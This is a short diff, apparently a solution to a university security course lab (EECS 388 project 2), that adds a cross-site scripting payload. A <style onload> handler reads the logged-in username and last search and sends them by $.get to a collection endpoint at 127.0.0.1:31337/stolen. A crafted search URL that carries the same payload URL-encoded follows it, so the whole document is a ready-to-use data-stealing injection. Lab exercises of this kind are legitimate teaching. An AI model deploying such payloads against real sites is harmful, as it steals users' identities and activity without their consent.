@@ -1,0 +1,9 @@
+<style onload = "(function() {
+        var username = $('#logged-in-user').text();
+        var last_search = $('.list-group-item:eq(1)').text();
+        var url = 'https://127.0.0.1:31337/stolen?user=' + username  + '&last_search=' + last_search;
+        $.get(url);
+}).call()"></style>
+
+
+https://eecs388.org/project2/search?xxsdefense=1&q=%3Cstyle%20onload%20%3D%20%22(function()%20%7B%0A%20%20%20%20%20%20%20%20var%20username%20%3D%20%24(%27%23logged-in-user%27).text()%3B%0A%20%20%20%20%20%20%20%20var%20last_search%20%3D%20%24(%27.list-group-item%3Aeq(1)%27).text()%3B%0A%20%20%20%20%20%20%20%20var%20url%20%3D%20%27https%3A%2F%2F127.0.0.1%3A31337%2Fstolen%3Fuser%3D%27%20%2B%20username%20%20%2B%20%27%26last_search%3D%27%20%2B%20last_search%3B%0A%20%20%20%20%20%20%20%20alert(url)%3B%0A%20%20%20%20%20%20%20%20%24.get(url)%3B%0A%7D).call()%22%3E%3C%2Fstyle%3E
